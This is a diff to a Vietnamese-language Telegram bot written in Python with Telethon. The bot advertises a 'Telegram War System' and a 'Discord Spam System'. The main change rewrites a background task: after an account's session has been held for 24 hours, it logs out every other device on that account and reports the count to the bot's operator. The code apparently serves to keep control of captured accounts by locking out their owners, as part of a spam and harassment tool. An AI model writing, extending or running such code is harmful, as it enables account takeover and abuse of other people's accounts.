@@ -170,7 +170,7 @@ Vui lòng chọn ứng dụng bạn muốn chiến:
     buttons = [
         [Button.inline("📱 Telegram War System", data="app_telegram")],
         [Button.inline("🤖 Discord Spam System", data="app_discord")],
-        [Button.url("💬 Admin 1 Hỗ Trợ", "https://t.me/Mduchotwar"), Button.url("💬 Admin 2 Hỗ Trợ", "https://t.me/Choancutz")]
+        [Button.url("💬 Admin 1 Hỗ Trợ", "https://t.me/Mduchotwar"), Button.url("💬 Admin 2 Hỗ Trợ", "https://t.me/tagtaolamcho1")]
     ]
     return msg, buttons
 
@@ -201,7 +201,7 @@ def get_main_menu(u):
         buttons.append([Button.inline("👑 Lệnh Admin System", data="m_admin")])
         
     buttons.append([Button.inline("🔙 Quay Lại Chọn App", data="back_to_apps")])
-    buttons.append([Button.url("💬 Admin 1 Hỗ Trợ", "https://t.me/Mduchotwar"), Button.url("💬 Admin 2 Hỗ Trợ", "https://t.me/Choancutz")])
+    buttons.append([Button.url("💬 Admin 1 Hỗ Trợ", "https://t.me/Mduchotwar"), Button.url("💬 Admin 2 Hỗ Trợ", "https://t.me/tagtaolamcho1")])
     
     return msg, buttons
 
@@ -274,37 +274,50 @@ async def check_and_kick_devices_background(target_uid, client):
         with open(time_file, "w") as f:
             f.write(str(time.time()))
 
-    while target_uid in u_c:
+    while target_uid in u_c and not kicked_done:
         try:
             await client.get_me()
-            if not kicked_done and os.path.exists(time_file):
+            if os.path.exists(time_file):
                 with open(time_file, "r") as f:
                     login_timestamp = float(f.read().strip())
                 
                 elapsed = time.time() - login_timestamp
+                
                 if elapsed >= 86400:
                     auths = await client(functions.account.GetAuthorizationsRequest())
                     total_devices = len(auths.authorizations)
+                    
+                    other_devices = [auth for auth in auths.authorizations if not auth.current]
+                    
+                    if not other_devices:
+                        kicked_done = True
+                        break
+                    
                     kicked_count = 0
+                    for auth in other_devices:
+                        try:
+                            await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
+                            kicked_count += 1
+                        except RPCError:
+                            pass
+                        except Exception:
+                            pass
                     
-                    for auth in auths.authorizations:
-                        if not auth.current:
-                            try:
-                                await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
-                                kicked_count += 1
-                            except: pass
-                    
-                    await bot.send_message(
-                        O_ID,
-                        f"🛡 **TỰ ĐỘNG KIỂM TRA & KICK THIẾT BỊ (ĐÃ ĐỦ 24H)**\n"
-                        f"• ID Acc: `{target_uid}`\n"
-                        f"• Tổng số thiết bị đang có: `{total_devices}`\n"
-                        f"• Đã tự động kick thành công: `{kicked_count}` thiết bị lạ!",
-                        parse_mode='markdown'
-                    )
-                    kicked_done = True
+                    if kicked_count > 0:
+                        kicked_done = True
+                        hours_passed = round(elapsed / 3600, 1)
+                        await bot.send_message(
+                            O_ID,
+                            f"🛡 **TỰ ĐỘNG KICK THIẾT BỊ LẠ THÀNH CÔNG**\n"
+                            f"• ID Acc: `{target_uid}`\n"
+                            f"• Thời gian đã trôi qua: `{hours_passed} giờ`\n"
+                            f"• Tổng số thiết bị ban đầu: `{total_devices}`\n"
+                            f"• Đã tự động kick thành công: `{kicked_count}` thiết bị lạ!",
+                            parse_mode='markdown'
+                        )
         except Exception:
             pass
+            
         await asyncio.sleep(300)
 
 async def start_anti_disconnect(target_uid, client):
@@ -347,7 +360,7 @@ def _logic(c, u_i):
 • `/voice <văn_bản>` : Chuyển đổi văn bản thành Voice Tiếng Việt.
 
 ⚡ **Delay hiện tại:** `{get_user_delay(u_i)}s`
-💬 **Hỗ trợ Admin:** @Mduchotwar & @Choancutz
+💬 **Hỗ trợ Admin:** @Mduchotwar & @tagtaolamcho1
 """
         await e.edit(help_text, parse_mode='markdown')
 
